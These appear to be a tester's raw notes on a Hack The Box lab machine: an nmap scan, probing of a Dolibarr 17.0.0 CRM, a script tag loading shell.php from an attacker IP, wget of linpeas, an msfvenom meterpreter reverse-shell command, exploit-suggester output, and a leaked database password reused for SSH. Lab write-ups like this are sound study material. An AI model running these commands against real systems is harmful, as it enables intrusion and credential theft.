- 10.129.87.244 board.htb
- 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- PHP 
- Apache 2.4.41
- Ubuntu
- Dolibarr 17.0.0 on crm subdomain

- board.htb
	- Email/Contact Feature
		- Doesnt seem to send params
	- News letter sign up
		- Doesnt seem to send params
	- Search Icon
		- Doesnt seem to send params
		- Has a ? at the end
- crm.board.htb
	- Dolibarr 17.0.0
		- [GitHub - nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253: Reverse Shell POC exploit for Dolibarr <= 17.0.0 (CVE-2023-30253), PHP Code Injection](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)
	- admin:admin - moves to an internal page but says access denied admin:password redirects to login
	- user:user - seems to redirct back to login
	- Forget password
	- Need help - redirects to a page that has external links
	- Robots.txt
		- User-agent: *
		- Allow: /public/agenda/agendaexport.php
		- Allow: /public/demo/
		- Allow: /public/members/new.php
		- Allow: /index.php
		- #Allow: /$
		- Disallow: /
	- Crete page 'test'
		- `<Script src="http://10.10.14.85:8001/shell.php"></script>`
		- You add dynamic PHP code that contains the PHP instruction 'proc_open' that is forbidden by default as dynamic content (see hidden options WEBSITE_PHP_ALLOW_xxx to increase list of allowed commands).
		- wget http://10.10.14.85:8001/linpeas.sh

Enumeration
	wget http://10.10.14.85:8001/linpeas.sh

Reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.85 LPORT=5555 -f elf -o reverse-sh.elf


╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded



$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

serverfun2$2023!!



larissa:serverfun2$2023!! - password reuse


╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root mail 23K Apr  7  2021 /usr/libexec/camel-lock-helper-1.2
-rwxr-sr-x 1 root shadow 43K Jan 10 05:55 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Jan 10 05:55 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root mail 15K Aug 26  2019 /usr/bin/mlock
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 31K Feb  6 04:49 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 83K Feb  6 04:49 /usr/bin/chage
-rwxr-sr-x 1 root ssh 343K Jan  2  2024 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
